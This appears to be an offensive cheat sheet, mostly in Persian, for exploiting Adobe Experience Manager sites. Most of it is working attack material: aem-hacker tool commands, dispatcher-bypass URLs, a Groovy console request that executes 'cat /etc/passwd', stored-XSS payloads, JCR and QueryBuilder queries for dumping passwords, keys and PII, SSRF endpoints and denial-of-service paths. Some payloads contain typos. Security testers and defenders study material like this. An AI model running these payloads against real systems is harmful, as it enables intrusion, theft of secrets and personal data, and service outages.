# 1 .   Aem misconfiguration

کلیپ

[https://www.youtube.com/watch?v=EQNBQCQMouk](https://www.youtube.com/watch?v=EQNBQCQMouk)

روش

ساب دامنه جمع اوری کنید

از nuclei/nuclei-templates/technologies/tech-detect.yaml برای شناسایی aem استفاده کنید

Python3 ./aem_hacker.py –u [https://example](https://example/) — host localhost

برای fuzz کردن aem از [https://github.com/clarkvoss/AEM-List/blob/main/paths](https://github.com/clarkvoss/AEM-List/blob/main/paths) استفاده کنید

ابزار های aem

[https://github.com/0ang3el/aem-hacker](https://github.com/0ang3el/aem-hacker)

[https://github.com/0ang3el/aem-rce-bundle](https://github.com/0ang3el/aem-rce-bundle)

```json
python3 aem_hacker.py    -u     --host yourvpshostname
python3 aem_discovery.py --file urls.txt --workers 150         => کشف url
python3 aem_enum.py      --url                                 => خودکار کردن یوزرنیم ها و گرفتن secret ها
python3 aem_ssrf2rce.py  --url  --fakaem yourvbs
python3 aem_server.py
```

**aem dispatcher bypasses**

بایپس cve 2016-0957

```
https://aemsite/bin/querybuilder.json              => blocked
https://aemsite/bin/querybuilder.json/a.css        => allow
https://aemsite/bin/querybuilder.json/a.html       => allow
https://aemsite/bin/querybuilder.json/a.ico        => allow
https://aemsite/bin/querybuilder.json/a.png        => allow
https://aemsite/bin/querybuilder.json;%0aa.css     => allow
https://aemsite/bin/querybuilder.json/a.1.json     => allow
```

بایپس برای servlets

```
https://aemsite/bin/querybuilder.json              => blocked
https://aemsite/bin/querybuilder.json/a.css        => block
https://aemsite/bin/querybuilder.json;%0aa.css     => block
https://aemsite/bin/querybuilder.json.servlet.css  => allow
https://aemsite/bin/querybuilder.json.servlet.html => allow
https://aemsite/bin/querybuilder.json.servlet.ico  => allow
https://aemsite/bin/querybuilder.json.servlet.png  => allow
///etc.json                 به جای -> /etc.json
///bin///quesrybuilder.json به جای ->  /bin/quesrybuilder.json
```

با استفاده از ssrf

ssrf باید اجازه ارسال GET ریکوئست و مشاهده ریسپانس رو بده

Opensocial proxy

 ssrf در reportingservices proxyservlet(cve-2018-12809)

rce via exposed Groovy console

```
POST /bin/groovyconsole/post.servlet HTTP/1.1
HOST:

script=sef+proc+%3d+"cat+/etc/passwd".execute()%0d%0aprintln+proc.txt
```

xss

```
POST //////content/usergenerated/etc/commerce/smartlists/vv.json

aa=alert('xss+on+'%2b+document.domain+%2b+'\nby+%400ang3el+\ud83d\ude00')%3b
```

```
POST /content/usergenerated/etc/commerce/smartlists/xss

aaa.html=alert('xss+on+'%2b+document.domain+%2b+'\nby+%400ang3el+\ud83d\ude00')%3b
```

```
POST /content/usergenerated/etc/commerce/smartlists/xssed

jcr:data=alert('xss+on+'%2b+document.domain+%2b+'\nby+%400ang3el+\ud83d\ude00')%3b&jcr:mimeType=text/html
```

ecret from jcr

```
everything is stored in jcr repository :
- secrets (password  ,encryption key , tokens)
- cinfiguration
- pII
- usernames

** what to use **
- DefaultGETServlet
- QueryBUilderJsonServlet
- QueryBuilderFeedServlet
- GQLSearch Servlet
- other

** DefaultGETServlet **
- Allows to get jsr node with its props
- selectors
  - tidy
  - infinity
  - numeric value:-1,0,1...99999
- formats
  - json
  - xml
  - res  
  
- https://aem.site/tidy.3.json
  /    => jcr:root
  tidy => selector tidy
  3    => selector depth
  json => output format

- how to grap
 - get node names, start from jcr:root :
    - /.1.json
    - /.ext.json
    - /.childrenlist.json
 - or guess node names :   
    - comman names /content, /home, /var, /etc
 - Dump props for each child node of jcr:root :
    - /etc.json or /etc.s.json or /etc.-1.json 

- what to grap      
 - interesting nodes
    - /etc => may contain secrets (pass,enc,keys)
    - /apps/system/config => passwords
    - /apps/<smth>/config => passwords
    - /var => may contain private pii
    - /home => password hashed ,pii
 - interesting props-contain aem usernames
    - jcr:createdBy
    - jcr:lastModifiedBy
    - cq:LastModifiedBy
```

QueryBuild Servlets

```
- path 
   - /bin/querybuilder.json
   - /bin/querybuilder.feed.servlet

- examples of useful searches
 - type=nt:file&nodename=*.zip
 - path=/home&p.hits-full&p.limit=-1
 - hasPermission=jcr:write&path=/content
 - hasPermission=jcr:addChild Nodes&path=/content
 - hasPermission=jcr:modify Properties&path=/content
 - p.hits-selective&p.properties=jcr%3alastModifiedBy&property=jcr%3alast ModifiedBy&property.operation-unequals&property.value=admin&type=nt%3abase&p.limit=1000
 - path=/etc&path.flat=true&p.nodedepth=0
 - path=/etc/replication/agents.author&p.hits-full&p.nodedepth=-1
```

اکسپلویت SSRF

```
ssrf via Opensocial proxy
 - /libs/opensocial/proxy?container=default&url=http://target
 - /libs/shindig/proxy?container=default&url=http://target
```

ReportingServices ProxyServlet

```
SSRF via ReportingServices ProxyServlet (CVE-2018-12809)
- /libs/ca/contentinsight/content/proxy.reportingservices.json?url=http://target%23/apil.omniture.com/a&q=a
- /libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet?url=http://target%23/apil.omniture.com/a&q=a
- /libs/mcm/salesforce/customer.json?checkType=authorize&authorization_url=http://target&customer_key=zzzz&customer_secret-zzzz&redirect_uri=xxxx&code=e

SSRF via SiteCatalystServlet
- /libs/cq/analytics/components/sitecatalystpage/segments.json.servlet 
- /libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json
```

DOS

```
- /.ext.infinity.json
- /.ext.infinity.json?tidy=true
- /bin/querybuilder.json?type=nt:base&p.limit=-1
- /bin/wcm/search/gql.servlet.json?query=type:base%20limit:..-1&pathPrefix=
- /content.assetsearch.json?query=*&start=0&limit=10&random=123
- /..assetsearch.json?query=*&start=0&limit=10&random=123
- /system/bgservlets/test.json?cycles-999999&interval=0&flushEvery=111111111
```